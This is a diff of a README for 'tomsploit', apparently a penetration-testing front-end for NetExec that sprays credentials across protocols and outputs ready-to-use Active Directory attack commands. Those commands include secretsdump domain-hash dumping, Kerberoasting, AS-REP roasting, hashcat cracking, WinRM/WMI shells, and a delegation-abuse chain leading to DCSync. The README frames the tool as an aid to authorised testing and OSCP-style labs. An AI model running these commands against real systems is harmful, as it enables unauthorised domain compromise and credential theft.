@@ -1,169 +1,230 @@
-A NetExec orchestrator built around an enumeration workflow: test one credential set against every relevant protocol on every host, and when something works, print the exact commands you'd normally tab back to your notes for.
+# tomsploit
 
-Demo 
+Fast [NetExec](https://github.com/Pennyw0rth/NetExec) (`nxc`) triage across protocols and targets.
 
-⚡ tomsploit
+`tomsploit` sprays a credential set against every available protocol, confirms which logins are valid, and prints the **exact follow‑up commands** for each win — already filled in with the target, domain, username and credential. When a login works on a domain controller it runs a read‑only enrichment pass and writes a per‑account **Kerberos delegation walkthrough** to disk.
 
+It is a careful `nxc` front‑end with a context‑aware command generator, **not** a one‑shot attack‑and‑loot engine.
 
-  Targets         │ 1           Protocols │ all
-  Users           │ 1           Workers   │ 15
-  Credentials     │ 1p / 0h     Timeout   │ 30s/attempt
-  Log file        │ 2026-05-27_15-30-00.txt
-  Total attempts  │ 15
-  
+```
+$ tomsploit -t 10.129.205.35 -u carole.rose -p 'jasmine'
+  ...
+  ✔ SMB (domain)   INLANEFREIGHT.LOCAL\carole.rose:jasmine
+  ✔ LDAP (domain)  INLANEFREIGHT.LOCAL\carole.rose:jasmine
+  ⊕ enrich  delegation: 2x constrained_pt, 2x unconstrained; MAQ: 0; roastable: 7
 
+  🔑 Delegation — 4 finding(s)
+      callum.dixon   DCSync (capture DC TGT)      need: secret: AS-REP roastable now
+      beth.richards  DCSync (delegates to the DC) need: secret: kerberoastable now
+      DMZ01$         SYSTEM on WS01.INLANEFREIGHT.LOCAL
+      SQL01$         DCSync (capture DC TGT)      need: SYSTEM on SQL01 or its hash
 
-  ► 172.16.1.20
+      full commands → tomsploit-delegation-10.129.205.35-carole.rose.txt
+```
 
+---
 
-  📋 Results (172.16.1.20) [DC] [3.4s]
+## Scope
 
-    Windows Server 2019 (name:DC01) (domain:corp.local)
+**Enumeration only.** `tomsploit` finds and reports access — and flags relay‑able hosts, domain controllers, anonymous access, and credentials that are valid‑but‑unusable — but it does not exploit, dump, or loot. Every enrichment query reads the directory; nothing is modified. The tool hands you the commands to take the next step yourself.
 
-  ✔ SMB (domain)         DC01 corp.local\admin:Password123! (Pwn3d!)
-  
-  ✔ LDAP (domain)        DC01 corp.local\admin:Password123!
-  
-  ✔ WMI (domain)         DC01 corp.local\admin:Password123! (Pwn3d!)
-  
-  ✔ WINRM (domain)       DC01 corp.local\admin:Password123! (Pwn3d!)
+This makes it well suited to lab/OSCP/OSEP‑style workflows and authorised engagements where you want a fast read on what a credential unlocks and a ready‑to‑run plan for each finding.
 
+> Use only against systems you are authorised to test.
 
+---
 
-  ✓ VALID CREDENTIALS
+## Features
 
-    ► SMB (domain)        │ corp.local\admin:Password123! (Pwn3d!) [admin]
-    ► LDAP (domain)       │ corp.local\admin:Password123!
-    ► WMI (domain)        │ corp.local\admin:Password123! (Pwn3d!) [admin]
-    ► WINRM (domain)      │ corp.local\admin:Password123! (Pwn3d!) [admin]
+- **Multi‑protocol spray** across `smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs` (VNC and NFS off by default), domain and local‑auth in one pass.
+- **Flexible credentials:** password, NTLM hash (Pass‑the‑Hash), Kerberos ticket cache, or a `user:secret` combo file. Cross‑spray or positional pairing.
+- **Context‑aware next commands** per valid login, with a one‑line outcome hint on each ("what a hit looks like and where it leads", not a description of the command).
+- **Pre‑flight port probe** to skip protocols whose port is closed, and lockout‑aware spray accounting.
+- **Relay / DC / anonymous‑access detection** surfaced as first‑class findings.
+- **Automatic Kerberos delegation engine** (see below) — the headline feature.
+- **Three verbosity levels** for the command output: `--bare` (commands only), default (commands + one‑line hints), `--notes` (full reasoning and caveats).
+- **Paste‑ready script output** with `--sh`.
+- **Single file, no install** — `scp tomsploit.py` onto a box and run it.
 
-  💡 Suggested Commands [DC]
+---
 
+## The delegation engine
 
-    ► [SMB]
-        # crackmapexec --shares
-        crackmapexec smb 172.16.1.20 -u admin -p Password123! --shares
+When an LDAP credential works on a DC, `tomsploit` runs a batch of read‑only queries and turns the results into an actionable, per‑account Kerberos‑delegation plan.
 
-        # secretsdump -just-dc
-        impacket-secretsdump -just-dc corp.local/admin:Password123!@172.16.1.20
+It enumerates delegation with `--find-delegation`, then resolves each finding with targeted queries so the routes are **decisions, not homework**:
 
-        # smbclient (interactive)
-        smbclient //172.16.1.20/<SHARE> -U 'corp.local\admin%Password123!'
+- **Roastability** — for each delegating account, is it kerberoastable (`servicePrincipalName`) or AS‑REP‑roastable (`userAccountControl`) *right now*? The route emits the exact roast command instead of "kerberoast it if it has an SPN".
+- **Disabled accounts** — a route on a disabled account is marked dead up front.
+- **MachineAccountQuota** — resolves whether RBCD "add a computer" is even possible (`MAQ 0` → path dead).
+- **`msDS-AllowedToDelegateTo`** — the full constrained‑delegation target list, so "this delegates to the DC" (→ DCSync via an `ldap/` sname swap) is detected authoritatively.
+- **Direct‑ACE writers** (`daclread`, per account) — who can write the account's SPN / RBCD attribute, for the direct‑ACE case. Group‑inherited rights are invisible to this and the output says so, pointing you to BloodHound.
 
-    ► [LDAP]
-        # kerbrute userenum
-        kerbrute userenum --dc 172.16.1.20 -d corp.local /usr/share/seclists/Usernames/Names/names.txt
+Each abusable delegation is written to `tomsploit-delegation-<ip>-<user>.txt` as a self‑contained route:
 
-        # AS-REP roast
-        impacket-GetNPUsers corp.local/admin:Password123! -request -format hashcat -outputfile asrep.hash -dc-ip 172.16.1.20
+```
+# ╭─────────────────────────────────────────────────────────────────────────╮
+# │ [2/4]  CONSTRAINED + PROTOCOL TRANSITION on beth.richards →              │
+# │        DC01.INLANEFREIGHT.LOCAL (the DC)                                 │
+# ╰─────────────────────────────────────────────────────────────────────────╯
+#
+# GET     : DCSync — every hash in the domain (incl. krbtgt)
+# REQUIRED: beth.richards's secret — nothing else
+# MISSING : beth.richards's secret — kerberoast now (cmd below)
+# WHY     : the allowed SPN is on the DC, so swapping the service class
+#           TERMSRV/ → ldap/ on the same host yields a DCSync ticket
+#
+    # ── GET THE CRED: beth.richards holds an SPN — kerberoastable now:
+    nxc ldap 10.129.205.35 -u carole.rose -p 'jasmine' \
+      --kerberoasting beth.richards.roast --kerberoast-account beth.richards
+    hashcat -m 13100 beth.richards.roast /usr/share/wordlists/rockyou.txt
+    # dump every credential in the domain:
+    impacket-getST -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -altservice ldap/DC01.INLANEFREIGHT.LOCAL \
+      -impersonate administrator 'INLANEFREIGHT.LOCAL/beth.richards:<beth.richards-PASSWORD>' -dc-ip 10.129.205.35
+    ...
+```
 
-        # Kerberoast (SPN tickets)
-        impacket-GetUserSPNs -request -dc-ip 172.16.1.20 corp.local/admin:Password123! -outputfile kerb.hash
+Each route reads:
 
-        # BloodHound
-        bloodhound-python -u admin -p Password123! -d corp.local -dc DC01.corp.local -ns 172.16.1.20 -c All --zip
+| Field | Meaning |
+|-------|---------|
+| **GET** | what you end up holding if the steps succeed |
+| **REQUIRED** | the complete prerequisite list for the commands |
+| **MISSING** | the subset of REQUIRED you don't hold yet, each with how to get it |
+| **WHY** | the mechanism, where it isn't obvious from the commands |
 
-    ► [WMI]
-        # wmiexec
-        impacket-wmiexec corp.local/admin:Password123!@172.16.1.20
+Notes on the generated file:
 
-    ► [WINRM]
-        # evil-winrm
-        evil-winrm -i 172.16.1.20 -u admin -p Password123!
+- **Values are filled in.** DC name/FQDN, your account, chosen passwords — only genuinely unknown things (a secret you haven't cracked, a runtime ticket blob) stay as `<placeholders>`.
+- **It's aware of the account you ran as.** If a route is *for* the account you authenticated with, it doesn't tell you to roast a password you already hold — it uses your real credential and marks the secret as held.
+- **It's paste‑safe.** Drop the file into a shell and it runs only the fully‑resolved commands; anything with an unfilled `<placeholder>` is commented out. Every value pulled from Active Directory (account names, SPNs, ACL trustees) is sanitised, so a hostile object name can't inject a command.
+- **The commands use the correct impacket syntax** — passwords go in the identity string (`domain/user:password`), because `getST`/`rbcd`/`addcomputer` have no `-p` flag.
 
+Disable the whole pass with `--no-enrich`. Run the same engine offline on `findDelegation` output you already have with `--deleg-in` (see below).
 
-  🎯 Next Steps
+---
 
+## Requirements
 
-  Domain Controllers detected
+- **Python 3.10+** (uses `X | None` type syntax).
+- **[NetExec](https://github.com/Pennyw0rth/NetExec)** (`nxc`) on `PATH` — the scanning engine.
+- Standard library only; no `pip install` for tomsploit itself.
+- Optional, only for `-k` ticket conversion: `impacket-ticketConverter`.
 
-    ► DC01 (172.16.1.20) — corp.local
+The **generated commands** reference the usual AD toolkit (impacket, hashcat, certipy, BloodHound, krbrelayx, PetitPotam, Rubeus, …). You run those yourself; tomsploit doesn't require them to be installed to *emit* the commands.
 
-  No-auth AD attacks (try alongside any creds found above)
+---
 
-        # enumerate valid usernames at corp.local
-        kerbrute userenum --dc 172.16.1.20 -d corp.local /usr/share/seclists/Usernames/Names/names.txt
+## Install
 
-        # AS-REP roast — any user with preauth disabled = free hash
-        impacket-GetNPUsers corp.local/ -dc-ip 172.16.1.20 -request -no-pass -usersfile users.txt
-
-  Cracking captured hashes
-
-        # AS-REP (Kerberos 5 AS-REP)
-        hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
-
-        # Kerberoast (Kerberos 5 TGS-REP)
-        hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
-
-        # NTDS / SAM (NTLM)
-        hashcat -m 1000 ntds.hash /usr/share/wordlists/rockyou.txt
-
-
-Features
-
-10 protocols sprayed in parallel: SMB, LDAP, WinRM, WMI, RDP, MSSQL, SSH, FTP, VNC, NFS
-Password, hash (NTLM), and Kerberos authentication 
-— auto-filtered per protocol so hashes never hit SSH
-DC detection drives smarter follow-ups: 
-secretsdump -just-dc over a DC instead of the full SAM/LSA/NTDS chain that hangs on RemoteRegistry
-CIDR expansion with a configurable per-block host cap
-Pre-flight port probe skips closed ports so a /24 scan finishes in minutes
-Anonymous SMB detection with its own follow-up command set
-Guest-mapping detection — separates real Samba guest fallbacks from legitimate auth (no more "Pwn3d!" excitement that was actually map to guest = bad user)
-OSCP-tuned suggestions — enum4linux-ng, crackmapexec --shares, kerbrute userenum, impacket-GetUserSPNs, BloodHound with the right collection method, etc.
-Post-scan Next Steps with no-auth AD attacks (worth running even when you already have creds — finds users your wordlist missed) and hashcat mode references
-Outputs: TSV credentials file (--creds-file), structured JSON (--json-output), nxc log
-Multi-target safe — an error on one host doesn't kill the rest
-Graceful Ctrl-C — first cancels in-flight calls, second forces exit
-
-
-Install
-Single-file Python script, no packaging required:
-bash
-git clone https://github.com/<your-user>/tomsploit.git
+```bash
+git clone https://github.com/<you>/tomsploit.git
 cd tomsploit
 chmod +x tomsploit.py
-sudo cp tomsploit.py /usr/local/bin/tomsploit   # optional
-Requirements
+./tomsploit.py --help
+```
 
-Python 3.10+
-NetExec on $PATH (nxc --version should work)
+Or just copy the one file where you need it:
 
-The follow-up commands assume standard Kali tooling — impacket-*, evil-winrm, crackmapexec, kerbrute, bloodhound-python, hashcat, xfreerdp3, etc. None of these are required to run tomsploit; they're only referenced in the suggested commands you can copy-paste.
+```bash
+scp tomsploit.py kali@box:/tmp/ && ssh kali@box python3 /tmp/tomsploit.py -h
+```
 
-Usage
-texttomsploit -t <TARGET> -u <USER> -p <PASSWORD>
-tomsploit -t <TARGET> -u <USER> -H <NTLM_HASH>
-tomsploit -t <TARGET> -u <USER> -k                  # use existing Kerberos ticket cache
-Examples
-bash# Single host, single credential
-tomsploit -t 192.168.1.10 -u admin -p 'Password123!'
+---
 
-# /24 with wordlists
+## Usage
+
+```bash
+# Password against one host
+tomsploit -t 192.168.1.10 -u admin -p 'Password123'
+
+# Spray a users list × passwords list across a /24
 tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt
 
-# Pass-the-hash across a subnet
-tomsploit -t 192.168.1.0/24 -u Administrator -H aad3b...:31d6cfe0...
+# Pass-the-Hash
+tomsploit -t target.htb -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
-# Kerberos ticket-cache auth (requires KRB5CCNAME)
-export KRB5CCNAME=./admin.ccache
+# Positional pairing: line N of users.txt only against line N of hashes.txt
+tomsploit -t 192.168.1.10 -u users.txt -H hashes.txt --paired
+
+# Combo file (user:secret per line; hashes auto-detected and used as PtH)
+tomsploit -t 192.168.1.10 --combo creds.txt
+
+# Kerberos ticket cache
 tomsploit -t dc01.corp.local -u admin -k
 
-# Selective protocols
-tomsploit -t target -u admin -p pw --protocols smb,winrm,rdp
+# Restrict protocols
+tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
 
-# Save valid creds to a side file, dump structured results to JSON
-tomsploit -t targets.txt -u u.txt -p p.txt \
-    --creds-file creds.tsv --json-output scan.json
-Common flags
-FlagPurpose-t, --targetIP, hostname, CIDR, or path to a file of any of these-u, --userUsername or path to a users file-p, --passwordPassword or path to a passwords file-H, --hashNTLM hash (LM:NT or NT) or path to a hash file-k, --kerberosUse existing Kerberos ticket cache--protocolsComma-separated subset to scan--creds-fileAppend valid credentials to TSV file--json-outputWrite structured results to JSON file--no-port-probeSkip pre-flight TCP probe (slower, sometimes more accurate)--max-cidr-hostsCap on CIDR expansion size (default 1024)-q, --quietSuppress banner and negatives--debugPrint full Python tracebacks on errors
-Run tomsploit --help for the full list.
+# Paste-ready shell script (findings become comments; progress goes to stderr)
+tomsploit -t 192.168.1.10 -u admin -p pw --sh > next.sh
+```
 
-How it works
+### Delegation
 
-Expand targets — IPs, hostnames, CIDRs, or files of any of them are resolved to a deduplicated list.
-Port probe — quick TCP connect to each protocol's default port. Hosts with no open services are skipped; protocols with closed ports are skipped per-host.
-Spray — for every (target, protocol, credential) combination, run nxc <proto> <target> -u <user> {-p|-H|--use-kcache}. Tasks parallelise across protocols and hosts; combination mode is the default (every user × every secret).
-Parse — [+], [-], [*], [!] lines are categorised. Successes ([+]) are split into real credentials vs Samba guest mappings; (Pwn3d!) flags admin privileges.
-Suggest — for each successful (protocol, auth_type) tuple, render the relevant follow-up commands with shlex.quote so passwords with shell metacharacters paste cleanly.
-Next Steps — after every target is scanned, aggregate findings: list detected DCs, emit kerbrute and AS-REP no-auth commands per unique domain, show output-file paths.
+```bash
+# Automatic: a valid DC login triggers the enrichment pass and writes
+# tomsploit-delegation-<ip>-<user>.txt with the routes.
+tomsploit -t 10.10.10.5 -u carole -p pw
+
+# Skip the extra queries
+tomsploit -t 10.10.10.5 -u carole -p pw --no-enrich
+
+# Offline: run the delegation engine on findDelegation output you already have.
+# --dc-name enables the "delegates to the DC" (= domain compromise) detection.
+nxc ldap 10.10.10.5 -u u -p p --find-delegation \
+  | tomsploit --deleg-in - -t 10.10.10.5 -d corp1.com --dc-name DC01 -u u -p p
+```
+
+### Output verbosity
+
+| Flag | Command output |
+|------|----------------|
+| `--bare` | commands only — nothing else |
+| *(default)* | commands + a one‑line outcome hint on each |
+| `--notes` | full reasoning, caveats, and commented‑out alternatives |
+| `-q` / `--quiet` | just valid creds + suggested commands |
+| `-v` / `--verbose` | every `nxc` line, including each failed login |
+| `--sh` | flush‑left, uncoloured, paste‑ready shell script |
+
+---
+
+## Key options
+
+```
+-t, --target        IP, hostname, CIDR, or file of any of these
+-u, --user          username or path to users file
+-p, --password      password or path to passwords file
+-H, --hash          NTLM hash (LM:NT or NT), or a file of hashes
+-k, --kerberos      use a Kerberos ccache (optionally a ticket file path)
+-d, --domain        AD domain for domain-scope auth
+--paired            positional pairing instead of cross-spray
+--combo FILE        user:secret combo file (implies pairing)
+--protocols LIST    comma-separated subset of the supported protocols
+--no-enrich         skip the post-scan LDAP delegation enrichment
+--deleg-in FILE     run the delegation engine offline on findDelegation output
+--dc-name NAME      DC short hostname, for the offline "delegates to DC" check
+--deleg-out FILE    where to write the delegation file
+--bare / --notes    less / more detail in the command output
+--sh                emit a paste-ready shell script
+-o, --output FILE   write a consolidated scan log
+--json-output FILE  write structured results as JSON
+--creds-file FILE   append valid credentials to a TSV
+```
+
+Run `tomsploit --help` for the complete list.
+
+---
+
+## Safety & correctness notes
+
+- **Read‑only by design.** The enrichment pass and every generated‑file value come from directory reads; tomsploit itself performs no writes.
+- **Generated files hold live credentials.** The delegation file prints the credential it ran with (it's already in the runnable commands), so treat `tomsploit-delegation-*.txt` as sensitive.
+- **Parsing is verified against tool source** (NetExec, impacket) and hardened against malformed, partial, and adversarial output — but the parsers should be sanity‑checked against a real DC's live output on first use in a new environment; `--no-enrich` restores plain behaviour if anything looks off.
+- **A louder footprint with enrichment on** — a DC login fires roughly a dozen `nxc` queries. Use `--no-enrich` on a monitored engagement if that matters.
+
+---
+
+## License
+
+MIT. See the license block at the end of `tomsploit.py`.
